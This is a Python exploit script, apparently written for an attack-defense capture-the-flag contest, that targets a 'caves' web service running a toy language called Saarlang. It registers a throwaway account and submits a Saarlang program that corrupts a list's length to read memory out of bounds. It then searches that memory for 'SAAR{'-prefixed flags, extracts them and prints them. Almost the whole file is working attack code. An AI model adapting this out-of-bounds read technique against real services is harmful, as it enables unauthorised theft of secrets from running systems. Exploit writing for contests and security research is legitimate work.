#!/usr/bin/env python3
import random
import logging
import re
import requests
import struct
import uuid
import sys
import time

deadline = time.time() + 55
logging.basicConfig(level=logging.INFO)
logging.info('argv = %s', sys.argv)

host = sys.argv[1]
port = '9080'
hh = host.split(':')
if len(hh) == 2:
    host, port = hh
url = f'http://{host}:{port}'
session = requests.Session()

r = session.post(f'{url}/api/users/register', json={'username': str(uuid.uuid4()), 'password': str(uuid.uuid4())})
r.raise_for_status()

r = session.get(f'{url}/api/caves/list')
r.raise_for_status()
caves = sorted(r.json(), key=lambda x: int(x['created']))

source = '''
holmol "stdlib.sl";

eijo get_rekt(get: lischd int, rekt: lischd byte) gebbtserick int: {
  get@3 = 9223372036854775807 * 2 + 1;
  var angst: int = 0;
  solang 1: {
    solang (rekt@angst != 83) odder (rekt@(angst + 1) != 65) odder (rekt@(angst + 2) != 65) odder (rekt@(angst + 3) != 82) odder (rekt@(angst + 4) != 123): {
      angst = angst + 1;
    }
    solang rekt@angst != 0: {
      mach sahmol_ln(rekt@angst);
      angst = angst + 1;
    }
    mach sahmol_ln(666);
  }
}

eijo main() gebbtserick int: {
  var i: int = 0;
  solang i < 1024: {
    neie lischd byte(4);
    i = i + 1;
  }
  mach get_rekt(neie lischd byte(4), neie lischd byte(4));
}
'''

flags = set()
for i in range(16):
    for cave in caves[-4:]:
        cave_id = cave['id']
        logging.info('i = %d, cave = %s', i, cave)
        r = session.post(f'{url}/api/visit', json={'cave_id': cave_id, 'files': {'foo.sl': source}})
        start = b'--- Saarlang execution starts ---\n'
        start_index = r.content.find(start)
        if start_index == -1:
            continue
        flag = bytearray()
        for value in r.content[start_index + len(start):].decode().split():
            try:
                value = int(value)
            except ValueError:
                break
            if value == 666:
                try:
                    flag_str = flag.decode()
                except UnicodeDecodeError:
                    pass
                else:
                    if flag_str not in flags:
                        print(flag_str)
                        flags.add(flag_str)
                flag.clear()
            else:
                flag.append(value)
